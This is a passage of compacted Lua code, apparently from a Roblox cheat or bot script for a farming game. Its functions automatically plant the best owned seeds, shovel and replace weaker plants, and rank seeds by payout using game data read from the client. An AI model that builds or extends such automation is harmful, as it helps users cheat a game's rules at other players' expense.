			if ((G.count or 0)) ~= ((V.count or 0)) then
				return ((G.count or 0)) > ((V.count or 0))
			end
			return tostring(G.name or "") < tostring(V.name or "")
		end)
		return V
	end;
	GetBestOwnedSeedSmartSeedProgression = function()
		local G = Z.SmartSeedProgression.GetOwnedSeedsSmartSeedProgression()
		return G[1], G
	end,
	GetPhysicalPlantSmartSeedProgression = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local V = Z.Farm.GetMyPlantsFolder()
		if not V or not V.Parent then
			return nil
		end
		local y = V:FindFirstChild(G)
		if y then
			return y
		end
		for V, y in ipairs(V:GetChildren()) do
			local Z = tostring(y:GetAttribute("PlantId") or y:GetAttribute("PlantID") or y:GetAttribute("Id") or y.Name or "")
			if Z == G then
				return y
			end
		end
		return nil
	end,
	GetGardenPlantsSmartSeedProgression = function()
		local G = {}
		local V = {}
		local y = Z.FruitFiltersDataSync
		if y and (not y.Started and type(y.StartSync) == "function") then
			y.StartSync()
		end
		if y and type(y.Plants) == "table" then
			for y, j in pairs(y.Plants) do
				if type(j) ~= "table" or j.Removed then
					continue
				end
				local i = tostring(j.PlantName or "")
				local c = tostring(j.Id or j.PlantId or y or "")
				if i == "" or c == "" then
					continue
				end
				V[c] = true
				table.insert(G, {
					id = c,
					name = i,
					rarity = tostring(g.SeedRarity[i] or "Unknown");
					score = Z.SmartSeedProgression.GetSeedScoreSmartSeedProgression(i);
					data = j;
					physical = Z.SmartSeedProgression.GetPhysicalPlantSmartSeedProgression(c)
				})
			end
		end
		for y, j in ipairs(Z.Farm.GetPlants()) do
			local i = tostring(j.Name or "")
			if i == "" or V[i] then
				continue
			end
			local c = tostring(j:GetAttribute("SeedName") or "")
			if c == "" then
				continue
			end
			V[i] = true
			table.insert(G, {
				id = i,
				name = c,
				rarity = tostring(g.SeedRarity[c] or "Unknown");
				score = Z.SmartSeedProgression.GetSeedScoreSmartSeedProgression(c);
				data = nil;
				physical = j
			})
		end
		return G
	end,
	IsProtectedPlantSmartSeedProgression = function(G)
		local V = h.smart_seed_progression_prevent_shovel_plants
		if type(V) ~= "table" then
			return false
		end
		return V[tostring(G or "")] == true
	end;
	IsProtectedRaritySmartSeedProgression = function(G)
		local V = h.smart_seed_progression_prevent_shovel_rarity
		if type(V) ~= "table" then
			return false
		end
		return V[tostring(G or "")] == true
	end;
	IsPreventedPlacementSeedSmartSeedProgression = function(G)
		local V = h.smart_seed_progression_prevent_placement_seeds
		if type(V) ~= "table" then
			return false
		end
		return V[tostring(G or "")] == true
	end,
	CleanPlantTraitSmartSeedProgression = function(G)
		G = tostring(G or "")
		G = G:match("^%s*(.-)%s*$") or ""
		if G == "" or G == "Normal" or G == "None" or G == "nil" then
			return ""
		end
		return G
	end;
	HasPlantMutationOrVariantSmartSeedProgression = function(G)
		if type(G) ~= "table" then
			return true, "unknown trait"
		end
		local V = G.data
		local y = {}
		if type(V) == "table" then
			table.insert(y, V.Mutation or V.mutation or V.PlantMutation)
			table.insert(y, V.Variant or V.variant or V.PlantVariant or V.Type)
		end
		local j = G.physical
		if typeof(j) == "Instance" and j.Parent then
			for G, V in ipairs({
				"Mutation",
				"Mutations";
				"PlantMutation",
				"Variant",
				"PlantVariant",
				"Type"
			}) do
				table.insert(y, j:GetAttribute(V))
			end
		end
		for G, V in ipairs(y) do
			local y = Z.SmartSeedProgression.CleanPlantTraitSmartSeedProgression(V)
			if y ~= "" then
				return true, y
			end
		end
		return false, ""
	end,
	GetShovelPlantIdSmartSeedProgression = function(G)
		if type(G) ~= "table" then
			return ""
		end
		local V = tostring(G.id or "")
		if V ~= "" then
			return V
		end
		local y = G.data
		if type(y) == "table" then
			V = tostring(y.Id or y.PlantId or y.PlantID or y.ID or "")
			if V ~= "" then
				return V
			end
		end
		local Z = G.physical
		if typeof(Z) == "Instance" and Z.Parent then
			return tostring(Z.Name or "")
		end
		return ""
	end,
	HasFruitSmartSeedProgression = function(G)
		if type(G) ~= "table" then
			return true
		end
		local V = G.data
		if type(V) == "table" then
			if Z.FruitFiltersDataSync.IsSingleHarvestPlant(G.name) and Z.FruitFiltersDataSync.IsPlantReady(V) then
				return true
			end
			for G, V in pairs(V.Fruits or {}) do
				if type(V) == "table" and not V.Removed then
					return true
				end
			end
		end
		local y = G.physical
		if typeof(y) == "Instance" and y.Parent then
			for G, V in ipairs(y:GetDescendants()) do
				if V:GetAttribute("Fruit") ~= nil or V:GetAttribute("FruitName") ~= nil or V:GetAttribute("HarvestedFruit") == true then
					return true
				end
			end
		end
		return false
	end;
	CanShovelPlantSmartSeedProgression = function(G, V)
		if type(G) ~= "table" or type(V) ~= "table" then
			return false, "invalid"
		end
		local y = tonumber(G.score)
		local j = tonumber(V.score)
		if not y or not j or j <= y then
			return false, "not better"
		end
		if Z.SmartSeedProgression.GetShovelPlantIdSmartSeedProgression(G) == "" then
			return false, "missing id"
		end
		local i = Z.SmartSeedProgression.HasPlantMutationOrVariantSmartSeedProgression(G)
		if i then
			return false, "mutation/variant"
		end
		if Z.SmartSeedProgression.IsProtectedPlantSmartSeedProgression(G.name) then
			return false, "protected plant"
		end
		if Z.SmartSeedProgression.IsProtectedRaritySmartSeedProgression(G.rarity) then
			return false, "protected rarity"
		end
		if Z.SmartSeedProgression.HasFruitSmartSeedProgression(G) then
			return false, "has fruit"
		end
		return true, "ok"
	end;
	GetWorstReplaceablePlantSmartSeedProgression = function(G)
		local V = Z.SmartSeedProgression.GetGardenPlantsSmartSeedProgression()
		local y = {}
		local j = {}
		for V, i in ipairs(V) do
			local c, J = Z.SmartSeedProgression.CanShovelPlantSmartSeedProgression(i, G)
			if c then
				table.insert(y, i)
			else
				j[J] = ((j[J] or 0)) + 1
			end
		end
		table.sort(y, function(G, V)
			if ((G.score or 0)) ~= ((V.score or 0)) then
				return ((G.score or 0)) < ((V.score or 0))
			end
			local y = g.RarityRank[tostring(G.rarity or "")] or 0
			local Z = g.RarityRank[tostring(V.rarity or "")] or 0
			if y ~= Z then
				return y < Z
			end
			return tostring(G.name or "") < tostring(V.name or "")
		end)
		return y[1], V, j
	end,
	GetGridPositionSmartSeedProgression = function(G)
		local V
		local y
		local j = Z.ControlMode.RightCol
		local i, c, J = Z.Farm.GetDefaultPlacementPositionFarm()
		if J ~= W.Default then
			V = i
			j = Z.ControlMode.BothCol
			if c then
				y = c.Name
			end
		else
			V = Z.Farm.GetPermanentCenterPosition()
		end
		if typeof(V) ~= "Vector3" then
			return nil, tostring(J or "Farm position") .. " not found"
		end
		local T = Z.FarmGrid.GetOpenSpotFarmGrid(V, j, function(V)
			if y and V.areaName ~= y then
				return false
			end
			return typeof(V.position) == "Vector3" and Z.Seeder.IsPositionOpen(V.position, G)
		end)
		if not T or typeof(T.position) ~= "Vector3" then
			return nil, "No open position near default placement"
		end
		return T.position
	end,
	EquipSeedToolSmartSeedProgression = function(G)
		G = tostring(G or "")
		local V = Z.Seeder.GetSeedTool(G)
		if not V then
			for y, j in ipairs(Z.Backpack.GetBackpackAllItems()) do
				local i = Z.SmartSeedProgression.GetToolCountSmartSeedProgression(j)
				if Z.SmartSeedProgression.GetSeedNameFromToolSmartSeedProgression(j) == G and (i > 0 and not Z.StackKeepOverrides.ShouldSkipItemStackKeepOverrides("Seed", G, i)) then
					V = j
					break
				end
			end
		end
		if not V then
			return nil, false
		end
		if Z.Player.IsToolHeld(V) then
			return V, false
		end
		if not Z.Player.EquipTool(V) then
			return nil, false
		end
		task.wait(.3)
		if not Z.Player.IsToolHeld(V) then
			return nil, false
		end
		return V, true
	end;
	PlaceSeedAtPositionSmartSeedProgression = function(G, V)
		if typeof(V) ~= "Vector3" then
			return false, "Placement position missing"
		end
		local y = Z.SmartSeedProgression.EquipSeedToolSmartSeedProgression(G)
		if not y then
			return false, "Seed tool missing"
		end
		if not y.Parent or not Z.Player.IsToolHeld(y) then
			return false, "Seed tool unequipped"
		end
		local j = Z.SmartSeedProgression.GetToolCountSmartSeedProgression(y)
		if j <= 0 then
			return false, "No seeds left"
		end
		local i, c = Z.Seeder.PlaceSeed(G, V, y)
		if i then
			return true, c
		end
		task.wait(.4)
		local J = Z.SmartSeedProgression.GetToolCountSmartSeedProgression(y)
		if J < j then
			return true, J
		end
		return false, "Placement not confirmed"
	end,
	PlantBestSeedSmartSeedProgression = function(G)
		G = G or Z.SmartSeedProgression.GetBestOwnedSeedSmartSeedProgression()
		if type(G) ~= "table" then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("No seed tools found", "#FFCC66")
			return false
		end
		local V = Z.Seeder.GetOccupiedPositions()
		local y = math.max(math.floor(tonumber(Z.SmartSeedProgression.MaxSpotAttemptsSmartSeedProgression) or 10), 1)
		local j = "Placement failed"
		for y = 1, y, 1 do
			local i, c = Z.SmartSeedProgression.GetGridPositionSmartSeedProgression(V)
			if not i then
				Z.SmartSeedProgression.SetStatusSmartSeedProgression(c or "Planting position unavailable", "#FF6666")
				return false
			end
			local J, T = Z.SmartSeedProgression.PlaceSeedAtPositionSmartSeedProgression(G.name, i)
			if J then
				q.PositionGrid.Add(V, i)
				Z.SmartSeedProgression.SetStatusSmartSeedProgression("Planted " .. tostring(G.name), "#7CFC00", string.format("best=%s | mode=grid | attempts=%d", tostring(G.name), y))
				task.wait(Z.Seeder.GetDelay())
				return true
			end
			j = tostring(T or "Placement failed")
			q.PositionGrid.Add(V, i)
			task.wait(.05)
		end
		Z.SmartSeedProgression.SetStatusSmartSeedProgression(j, "#FF6666")
		return false
	end,
	WaitForGardenCountBelowSmartSeedProgression = function(G, V)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		V = tonumber(V) or 3
		local y = os.clock()
		repeat
			if Z.GardenSeedLimit.GetCurrentCountGardenSeedLimit() < G then
				return true
			end
			task.wait(.1)
		until os.clock() - y >= V
		return false
	end;
	WaitForPlantRemovalSmartSeedProgression = function(G, V, y)
		V = math.max(math.floor(tonumber(V) or 0), 0)
		y = tonumber(y) or 3
		local j = type(G) == "table" and G.physical or nil
		local i = os.clock()
		repeat
			if typeof(j) == "Instance" and not j.Parent then
				return true
			end
			if Z.GardenSeedLimit.GetCurrentCountGardenSeedLimit() < V then
				return true
			end
			task.wait(.1)
		until os.clock() - i >= y
		return false
	end,
	ReplaceWorstPlantSmartSeedProgression = function(G, V)
		if Z.TotalControl.ResolveSmartSeedingEnabledTotalControl() == true then
			local G, V, y = Z.GardenSeedLimit.GetOverLimitStateGardenSeedLimit()
			if G then
				Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("Paused: garden over limit %d/%d", V, y), "#FFCC66", "Potted plants must be picked up before replacing plants")
				return false
			end
		end
		local y, j, i = Z.SmartSeedProgression.GetWorstReplaceablePlantSmartSeedProgression(G)
		if not y then
			local G = tonumber(i and i["protected rarity"] or 0) + tonumber(i and i["protected plant"] or 0)
			local V = string.format("plants=%d | protected=%d | fruit=%d | traits=%d | missingId=%d", # ((j or {})), G, tonumber(i and i["has fruit"] or 0), tonumber(i and i["mutation/variant"] or 0), tonumber(i and i["missing id"] or 0))
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("No safe plant to replace", "#FFCC66", V)
			return false
		end
		local c = Z.SmartSeedProgression.GetShovelPlantIdSmartSeedProgression(y)
		if c == "" then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Plant id not found", "#FF6666")
			return false
		end
		local J, T = Z.ShovelTool.Equip()
		if not J then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Shovel tool not found", "#FF6666")
			return false
		end
		Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("Replacing %s \226\134\146 %s", tostring(y.name), tostring(G.name)), "#FFCC66", string.format("worstScore=%.1f | bestScore=%.1f", tonumber(y.score) or 0, tonumber(G.score) or 0))
		if Z.TotalControl.ResolveSmartSeedingEnabledTotalControl() == true then
			local G, V, y = Z.GardenSeedLimit.GetOverLimitStateGardenSeedLimit()
			if G then
				Z.ShovelTool.Cleanup(T)
				Z.SmartSeedProgression.SetStatusSmartSeedProgression(string.format("Paused: garden over limit %d/%d", V, y), "#FFCC66", "Replacement cancelled before shovelling")
				return false
			end
		end
		local d = Z.ShovelTool.Use(c, "", J)
		Z.ShovelTool.Cleanup(T)
		if not d then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Shovel request failed", "#FF6666")
			return false
		end
		local u = Z.SmartSeedProgression.GetBestOwnedSeedSmartSeedProgression()
		if not u then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Plant removed, no seed left", "#FFCC66")
			return true
		end
		return Z.SmartSeedProgression.PlantBestSeedSmartSeedProgression(u)
	end,
	GardenDataReadySmartSeedProgression = function()
		local G = Z.FruitFiltersDataSync
		if not G then
			return true
		end
		if not G.Started and type(G.StartSync) == "function" then
			G.StartSync()
		end
		local V = type(G.CountLocalPlantsFruitFiltersDataSync) == "function" and G.CountLocalPlantsFruitFiltersDataSync() or 0
		local y = type(G.CountWorkspacePlantsFruitFiltersDataSync) == "function" and G.CountWorkspacePlantsFruitFiltersDataSync() or 0
		if y > 0 and V <= 0 then
			if type(G.RequestGardenDataFruitFiltersDataSync) == "function" then
				G.RequestGardenDataFruitFiltersDataSync()
			end
			return false
		end
		return true
	end;
	RunSmartSeedProgression = function()
		local G = Z.TotalControl.ResolveSmartSeedingEnabledTotalControl()
		if G ~= nil then
			if G ~= true then
				Z.SmartSeedProgression.ClearStatusSmartSeedProgression()
				return false
			end
			Z.TotalControl.SetStatusTotalControl("Using smart seeding", "#66CCFF")
		elseif h.smart_seed_progression_enabled ~= true then
			Z.SmartSeedProgression.ClearStatusSmartSeedProgression()
			return false
		end
		if Z.SmartSeedProgression.BusySmartSeedProgression then
			return false
		end
		if G == nil and h.auto_seedplace == true then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Paused: Seed Placer is enabled", "#FFCC66")
			return false
		end
		if G == nil and h.auto_shovel_plants == true then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Paused: Plant Shovel is enabled", "#FFCC66")
			return false
		end
		if not q.IsLoadingCompleted() then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Waiting for garden load", "#FFCC66")
			return false
		end
		if not Z.SmartSeedProgression.GardenDataReadySmartSeedProgression() then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Waiting for garden data", "#FFCC66")
			return false
		end
		local V, y = Z.SmartSeedProgression.GetBestOwnedSeedSmartSeedProgression()
		if not V then
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Waiting for seed tools", "#FFCC66", "owned=0")
			return false
		end
		local j = Z.GardenSeedLimit.GetCurrentCountGardenSeedLimit()
		local i = Z.GardenSeedLimit.GetCurrentLimitGardenSeedLimit()
		local c = Z.GardenSeedLimit.GetMaximumLimitGardenSeedLimit()
		local J = string.format("best=%s x%d | garden=%d/%d | max=%d | owned=%d", tostring(V.name), tonumber(V.count) or 0, j, i, c, # ((y or {})))
		Z.SmartSeedProgression.BusySmartSeedProgression = true
		local T, d = pcall(function()
			if j < i then
				Z.SmartSeedProgression.SetStatusSmartSeedProgression("Planting " .. tostring(V.name), "#66CCFF", J)
				return Z.SmartSeedProgression.PlantBestSeedSmartSeedProgression(V)
			end
			return Z.SmartSeedProgression.ReplaceWorstPlantSmartSeedProgression(V, i)
		end)
		Z.SmartSeedProgression.BusySmartSeedProgression = false
		if not T then
			Z.Player.UnequipTools()
			Z.SmartSeedProgression.SetStatusSmartSeedProgression("Smart seeding error", "#FF4444")
			warn("[SmartSeedProgression]", d)
			return false
		end
		return d == true
	end,
	LoopSmartSeedProgression = function()
		if Z.AdvancedIncomeFarm and (type(Z.AdvancedIncomeFarm.IsEnabledAdvancedIncomeFarm) == "function" and Z.AdvancedIncomeFarm.IsEnabledAdvancedIncomeFarm()) then
			return Z.AdvancedIncomeFarm.RunAdvancedIncomeFarm()
		end
		return Z.SmartSeedProgression.RunSmartSeedProgression()
	end
}
Z.AdvancedIncomeFarm = {
	BusyAdvancedIncomeFarm = false,
	CatalogAdvancedIncomeFarm = nil,
	CatalogSeedCountAdvancedIncomeFarm = 0,
	MedianFirstPayoutAdvancedIncomeFarm = 0,
	MedianSingleValueAdvancedIncomeFarm = 0,
	SlowFirstPayoutThresholdAdvancedIncomeFarm = 480,
	LastSnapshotAdvancedIncomeFarm = nil;
	LastSnapshotAtAdvancedIncomeFarm = 0;
	LastFruitReserveBuildAdvancedIncomeFarm = 0,
	LastFruitReserveStageAdvancedIncomeFarm = "",
	LastFruitReserveWeatherAdvancedIncomeFarm = false,
	FruitReserveLookupAdvancedIncomeFarm = {},
	GoodSingleHarvestLimitAdvancedIncomeFarm = 30,
	StarterSingleHarvestLimitAdvancedIncomeFarm = 20,
	LowFruitSlotThresholdAdvancedIncomeFarm = 3,
	MinimumUpgradeMultiplierAdvancedIncomeFarm = 1.25;
	PlantRulesAdvancedIncomeFarm = {
		RarityLimits = {
			Secret = 0;
			Super = 0,
			Mythic = 300;
			Legendary = 300;
			Epic = 99;
			Rare = 300,
			Uncommon = "All";
			Common = "All"
		},
		Seeds = {
			Carrot = {
				Limit = 15;
				FillOnly = true,
				FallbackOnly = true
			},
			Strawberry = {
				Limit = 9
			};
			Blueberry = {
				Limit = 30;
				FillOnly = true
			};
			Tulip = {
				Limit = 9,
				FillOnly = true
			};
			Tomato = {
				Limit = 700,
				UpgradeRank = 1
			};
			Apple = {
				Limit = 200
			},
			Bamboo = {
				RequiresSprinkler = true,
				BypassGoodSingleLimit = true
			},
			Corn = {
				Limit = 50,
				FillOnly = true
			},
			Cactus = {
				Limit = 1
			};
			Pineapple = {
				Limit = 3
			},
			["Green Bean"] = {
				Limit = 1
			};
			Banana = {
				Limit = 30
			},
			Grape = {
				Limit = 30
			},
			Coconut = {
				Limit = 800,
				UpgradeRank = 2
			};
			Mango = {
				Limit = 30
			},
			["Rocket Pop"] = {
				RequiresSprinkler = true;
				BypassGoodSingleLimit = true
			};
			["Dragon Fruit"] = {
				Limit = 3
			},
			Acorn = {
				Limit = 20
			},
			Cherry = {
				Limit = 800,
				UpgradeRank = 3
			}
		}
	};
	StageSettingsAdvancedIncomeFarm = {
		Recovery = {
			EvaluationWindow = 300;
			FoundationMultiRatio = .5,
			InvestmentRatio = .05;
			MatureMultiFloorRatio = .15;
			GoodSingleLimit = 0;
			ShortWeight = .85,
			LongWeight = .1;
			MutationWeight = .05,
			SlowFactor = .15;
			FruitReserveRatio = 0
		};
		Building = {
			EvaluationWindow = 900,
			FoundationMultiRatio = .6;
			InvestmentRatio = .1,
			MatureMultiFloorRatio = .4;
			GoodSingleLimit = 12,
			ShortWeight = .55;
			LongWeight = .35,
			MutationWeight = .1,
			SlowFactor = .45,
			FruitReserveRatio = .05
		};
		Compounding = {
			EvaluationWindow = 1800;
			FoundationMultiRatio = .75;
			InvestmentRatio = .2;
			MatureMultiFloorRatio = .5;
			GoodSingleLimit = 24,
			ShortWeight = .35,
			LongWeight = .5;
			MutationWeight = .15,
			SlowFactor = .75,
			FruitReserveRatio = .1
		};
		Rich = {
			EvaluationWindow = 3600;
			FoundationMultiRatio = .85;
			InvestmentRatio = .35,
			MatureMultiFloorRatio = .55,
			GoodSingleLimit = 30,
			ShortWeight = .2,
			LongWeight = .55;
			MutationWeight = .25;
			SlowFactor = 1;
			FruitReserveRatio = .2
		}
	};
	IsEnabledAdvancedIncomeFarm = function()
		if Z.TotalControl and (type(Z.TotalControl.IsEnabledTotalControl) == "function" and Z.TotalControl.IsEnabledTotalControl() == true) then
			return true
		end
		return h.smart_seed_progression_enabled == true
	end,
	GetMedianAdvancedIncomeFarm = function(G)
		if type(G) ~= "table" or # G == 0 then
			return 0
		end
		table.sort(G)
		local V = math.floor(((# G + 1)) / 2)
		if # G % 2 == 1 then
			return tonumber(G[V]) or 0
		end
		return ((((tonumber(G[V]) or 0)) + ((tonumber(G[V + 1]) or 0)))) / 2
	end,
	GetNumberRangeAverageAdvancedIncomeFarm = function(G)
		if typeof(G) ~= "NumberRange" then
			return 0
		end
		return ((G.Min + G.Max)) / 2
	end;
	GetStageSettingsAdvancedIncomeFarm = function(G)
		local V = Z.AdvancedIncomeFarm.StageSettingsAdvancedIncomeFarm[tostring(G or "")]
		if type(V) == "table" then
			return V
		end
		return Z.AdvancedIncomeFarm.StageSettingsAdvancedIncomeFarm.Recovery
	end,
	BuildCatalogAdvancedIncomeFarm = function()
		if type(y.GrowRateData) ~= "table" or type(g.SeedDataFast) ~= "table" then
			return false
		end
		local G = {}
		local V = {}
		local j = {}
		local i = 0
		for c, J in pairs(g.SeedDataFast) do
			if type(c) ~= "string" or c == "" or type(J) ~= "table" then
				continue
			end
			i += 1
			local T = y.GrowRateData[c]
			local d = J.mutation_seed == true
			local u = J.single == true
			local q = 0
			local E = 0
			local a = 0
			if type(T) == "table" then
				q = tonumber(T.GrowRate) or 0
				E = tonumber(T.FruitGrowRate) or 0
				a = Z.AdvancedIncomeFarm.GetNumberRangeAverageAdvancedIncomeFarm(T.GrowFruitTime)
			end
			local H = 0
			if Z.BuySelectFruit and type(Z.BuySelectFruit.GetBaseEstimatedPriceBuySelectFruit) == "function" then
				H = Z.BuySelectFruit.GetBaseEstimatedPriceBuySelectFruit(c, {
					SizeMultiplier = 1
				}, "")
			end
			local r = math.huge
			if q > 0 then
				r = 1 / q
			end
			local Y = r
			if not u then
				if E > 0 then
					Y = a + (1 / E)
				else
					Y = math.huge
				end
			end
			local e = r
			if not u then
				e = r + Y
			end
			local s = tostring(J.rarity or g.SeedRarity[c] or "Unknown")
			local N = {
				name = c;
				rarity = s,
				rarityRank = g.RarityRank[s] or 0;
				single = u,
				mutationSeed = d,
				cleanValue = math.max(tonumber(H) or 0, 0),
				growRate = q;
				fruitGrowRate = E,
				fruitSpawnDelay = a,
				plantTime = r,
				fruitCycleTime = Y;
				firstPayoutTime = e,
				valid = d or (H > 0 and (q > 0 and e < math.huge))
			}
			G[c] = N
			if N.valid and not d then
				table.insert(V, e)
				if u then
					table.insert(j, N.cleanValue)
				end
			end
		end
		local c = Z.AdvancedIncomeFarm.GetMedianAdvancedIncomeFarm(V)
		local J = Z.AdvancedIncomeFarm.GetMedianAdvancedIncomeFarm(j)
		local T = 480
		if c > 0 then
			T = math.clamp(c * 2, 180, 480)
		end
		for G, V in pairs(G) do
			if V.mutationSeed then
				V.slow = false
				V.goodSingle = false
				V.starterSingle = false
			else
				V.slow = V.firstPayoutTime > T
				V.goodSingle = V.single and (J > 0 and V.cleanValue >= J)
				V.starterSingle = V.single and not V.goodSingle
			end
		end
		Z.AdvancedIncomeFarm.CatalogAdvancedIncomeFarm = G
		Z.AdvancedIncomeFarm.CatalogSeedCountAdvancedIncomeFarm = i
		Z.AdvancedIncomeFarm.MedianFirstPayoutAdvancedIncomeFarm = c
		Z.AdvancedIncomeFarm.MedianSingleValueAdvancedIncomeFarm = J
		Z.AdvancedIncomeFarm.SlowFirstPayoutThresholdAdvancedIncomeFarm = T
		return true
	end;
	EnsureCatalogAdvancedIncomeFarm = function()
		local G = 0
		for V in pairs(g.SeedDataFast or {}) do
			G += 1
		end
		if type(Z.AdvancedIncomeFarm.CatalogAdvancedIncomeFarm) == "table" and (G > 0 and G == Z.AdvancedIncomeFarm.CatalogSeedCountAdvancedIncomeFarm) then
			return true
		end
		return Z.AdvancedIncomeFarm.BuildCatalogAdvancedIncomeFarm()
	end;
	GetCatalogInfoAdvancedIncomeFarm = function(G)
		if type(Z.AdvancedIncomeFarm.CatalogAdvancedIncomeFarm) ~= "table" and not Z.AdvancedIncomeFarm.EnsureCatalogAdvancedIncomeFarm() then
			return nil
		end
		return Z.AdvancedIncomeFarm.CatalogAdvancedIncomeFarm[tostring(G or "")]
	end,
	IsMutationSeedAllowedAdvancedIncomeFarm = function()
		local G = Z.TotalControl.ResolveMutationSeedsAllowedTotalControl()
		if G ~= nil then
			return G == true
		end
		return h.smart_seed_progression_mutation_seeds_enabled == true
	end;
	GetSeedRuleAdvancedIncomeFarm = function(G)
		local V = Z.AdvancedIncomeFarm.PlantRulesAdvancedIncomeFarm
		local y = nil
		if type(V) == "table" then
			y = V.Seeds
		end
		if type(y) ~= "table" then
			return nil
		end
		local j = y[tostring(G or "")]
		if type(j) ~= "table" then
			return nil
		end
		return j
	end,
	GetUpgradeRankAdvancedIncomeFarm = function(G)
		local V = Z.AdvancedIncomeFarm.GetSeedRuleAdvancedIncomeFarm(G)
		if type(V) ~= "table" then
			return 0
		end
		return math.max(math.floor(tonumber(V.UpgradeRank) or 0), 0)
	end,
	RequiresSprinklerAdvancedIncomeFarm = function(G)
		if type(G) ~= "table" then
			return false
		end
		if G.goodSingle == true then
			return true
		end
		local V = Z.AdvancedIncomeFarm.GetSeedRuleAdvancedIncomeFarm(G.name)
		return type(V) == "table" and V.RequiresSprinkler == true
	end;
	ResolvePlantLimitAdvancedIncomeFarm = function(G)
		if type(G) == "string" and G:lower() == "all" then
			return math.huge
		end
		local V = tonumber(G)
		if V == nil then
			return 0
		end
		return math.max(math.floor(V), 0)
	end,
	GetConfiguredRarityLimitAdvancedIncomeFarm = function(G)
		G = tostring(G or "")
		local V = l.total_control_advanced_plant_limits
		local y = nil
		local j = false
		if type(V) == "table" and V[G] ~= nil then
			y = V[G]
			j = true
		else
			local V = Z.AdvancedIncomeFarm.PlantRulesAdvancedIncomeFarm
			local j = nil
			if type(V) == "table" then
				j = V.RarityLimits
			end
			if type(j) == "table" then
				y = j[G]
			end
		end
		if not j then
			local V = g.RarityRank[G]
			local y = g.RarityRank.Super or 7
			if V == nil or V > y then
				return 0
			end
		end
		return Z.AdvancedIncomeFarm.ResolvePlantLimitAdvancedIncomeFarm(y)
	end;
	GetPlantLimitAdvancedIncomeFarm = function(G)
		if type(G) ~= "table" then
			return 0
		end
		if G.mutationSeed then
			return math.huge
		end
		local V = Z.AdvancedIncomeFarm.GetSeedRuleAdvancedIncomeFarm(G.name)
		if type(V) == "table" and V.Limit ~= nil then
			return Z.AdvancedIncomeFarm.ResolvePlantLimitAdvancedIncomeFarm(V.Limit)
		end
		return Z.AdvancedIncomeFarm.GetConfiguredRarityLimitAdvancedIncomeFarm(G.rarity)
	end;
	GetSprinklerDataLookupAdvancedIncomeFarm = function()
		local G = {}
		local V = nil
		if type(y.SprinklerData) == "table" then
			if type(y.SprinklerData.Data) == "table" then
				V = y.SprinklerData.Data
			else
				V = y.SprinklerData
			end
		end
		for V, y in ipairs(V or {}) do
			if type(y) == "table" and (type(y.SprinklerName) == "string" and y.SprinklerName ~= "") then
				G[y.SprinklerName] = y
			end
		end
		return G
	end,
	GetActiveSprinklersAdvancedIncomeFarm = function()
		local G = {}
		local V = y.GardenSyncController
		local j = Z.Farm.GetSpawnPoint()
		if type(V) ~= "table" or type(V.GetSprinklers) ~= "function" then
			return G
		end
		if typeof(j) ~= "Instance" or not j:IsA("BasePart") then
			return G
		end
		local i, c = pcall(function()
			return V:GetSprinklers(g.player_userid)
		end)
		if not i or type(c) ~= "table" then
			return G
		end
		local J = Z.AdvancedIncomeFarm.GetSprinklerDataLookupAdvancedIncomeFarm()
		local T = os.time()
		if Z.SprinklerTimeEsp and type(Z.SprinklerTimeEsp.GetServerNowSprinklerTimeEsp) == "function" then
			T = Z.SprinklerTimeEsp.GetServerNowSprinklerTimeEsp()
		end
		for V, y in pairs(c) do
			if type(y) ~= "table" then
				continue
			end
			local Z = tostring(y.SprinklerName or "")
			local i = J[Z]
			local c = y.Positions
			if Z == "" or type(i) ~= "table" or type(c) ~= "table" then
				continue
			end
			local d = tonumber(c.PosX)
			local u = tonumber(c.PosY)
			local q = tonumber(c.PosZ)
			if d == nil or u == nil or q == nil then
				continue
			end
			local g = tonumber(i.Lifetime)
			local E = tonumber(y.PlacedAt)
			local a = math.huge
			if g and E then
				a = (E + g) - T
			end
			if a < 5 then
				continue
			end
			table.insert(G, {
				name = Z,
				position = j.CFrame:PointToWorldSpace(Vector3.new(d, u, q));
				radius = math.max(tonumber(i.Radius) or 0, 0),
				growSpeed = math.max(tonumber(i.GrowSpeedBonus) or 1, 1),
				sizeLuck = math.max(tonumber(i.SizeLuckBonus) or 0, 0),
				remaining = a
			})
		end
		table.sort(G, function(G, V)
			if G.growSpeed ~= V.growSpeed then
				return G.growSpeed > V.growSpeed
			end
			return G.remaining > V.remaining
		end)
		return G
	end;
	IsGrowthWeatherActiveAdvancedIncomeFarm = function()
		return Z.WeatherTriggers and (type(Z.WeatherTriggers.IsTriggerActiveWeatherTriggers) == "function" and Z.WeatherTriggers.IsTriggerActiveWeatherTriggers("Rain") == true)
	end,
	IsMutationWeatherActiveAdvancedIncomeFarm = function()
		if Z.TotalControl and (type(Z.TotalControl.IsMutationSeedWeatherActiveTotalControl) == "function" and Z.TotalControl.IsMutationSeedWeatherActiveTotalControl() == true) then
			return true
		end
		local G = nil
		if type(y.WeatherData) == "table" then
			G = y.WeatherData.Data
		end
		for G, V in ipairs(G or {}) do
			local y = type(V) == "table" and tostring(V.Name or "") or ""
			if y ~= "" and (y ~= "Rain" and Z.WeatherTriggers.IsTriggerActiveWeatherTriggers(y) == true) then
				return true
			end
		end
		local V = (table.concat({
			tostring(y.Workspace:GetAttribute("ActiveWeather") or "");
			tostring(y.Workspace:GetAttribute("ActivePhase") or "")
		}, " ")):lower()
		for G, y in ipairs({
			"gold";
			"rainbow",
			"mega";
			"moon";
			"lightning",
			"snow";
			"star",
			"aurora";
			"sunburst"
		}) do
			if V:find(y, 1, true) then
				return true
			end
		end
		return false
	end,
	IsPlantMatureAdvancedIncomeFarm = function(G)
		if type(G) ~= "table" then
			return false
		end
		if type(G.data) == "table" then
			return Z.FruitFiltersDataSync.IsPlantReady(G.data) == true
		end
		local V = G.physical
		if typeof(V) ~= "Instance" or not V.Parent then
			return false
		end
